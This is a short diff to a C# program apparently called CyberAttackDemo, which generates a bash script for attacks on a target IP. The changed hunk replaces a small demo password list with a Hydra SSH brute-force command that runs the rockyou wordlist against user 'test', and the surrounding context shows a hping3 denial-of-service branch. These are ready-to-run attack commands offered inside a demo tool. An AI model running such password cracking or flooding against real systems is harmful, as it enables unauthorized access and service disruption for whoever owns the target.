@@ -89,7 +89,7 @@ namespace CyberAttackDemo
                     OnLogReceived?.Invoke($"[SYSTEM] Created directory: {dir}");
                 }
 
-                // 常に上書きして最新の状態にする
+                // 常に最新の内容で上書きする
                 {
                     string scriptContent = @"#!/bin/bash
 
@@ -129,17 +129,10 @@ if [ ""$MODE_ARG"" = ""hydra"" ]; then
     # --- Hydra SSH Crack ---
     echo ""[*] Starting Hydra SSH Password Cracking...""
     
-    # デモ用パスワードリスト作成
-    echo ""123456"" > passlist.txt
-    echo ""password"" >> passlist.txt
-    echo ""admin"" >> passlist.txt
-    echo ""root"" >> passlist.txt
-    echo ""kali"" >> passlist.txt
-    
-    # Hydra実行 (ユーザー名: root固定)
-    hydra -l root -P passlist.txt ssh://$TARGET_IP -t 4 -V -e ns
-    
-    rm passlist.txt
+    # 指定されたコマンドに変更
+    # -l test: ユーザー名 test
+    # -P /usr/share/wordlists/rockyou.txt: ロックユー辞書
+    hydra -l test -P /usr/share/wordlists/rockyou.txt ssh://$TARGET_IP -t 4 -V -e ns
 
 else
     # --- DoS Attack (hping3) ---
